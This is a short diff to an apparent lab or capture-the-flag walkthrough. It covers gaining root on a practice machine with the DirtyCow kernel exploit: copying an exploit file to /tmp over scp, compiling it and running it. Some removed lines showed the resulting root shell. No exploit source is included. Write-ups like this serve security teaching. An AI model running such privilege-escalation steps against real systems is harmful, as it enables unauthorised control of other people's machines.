@@ -7,19 +7,13 @@ We can start when we have the `www-data` reverse shell but its easier whit user 
 
 ## Step 2
 
-We upload the `c0w.c` exploit to /tmp folder, compile it and run it.
+We upload the one of the dirtycow exploit to /tmp folder, compile it and run it.
+DirtyCow is quite a unstable, not reliable exploit so sometime we have to try multiple implementation.
 
-    $> scp ./script/c0w.c laurie@192.168.56.101:/tmp/
-    $> gcc -pthread c0w.c
+    $> scp `exploit_code.c` laurie@192.168.56.101:/tmp/
+    $> gcc `exploit_code.c`
     $> ./a.out
 
-In another window, run `/usr/bin/passwd`.
-
-    $> /usr/bin/passwd
-    $> whoami
-        root
-    $> id -u
-        0
 
 ## Step 3
 Done !
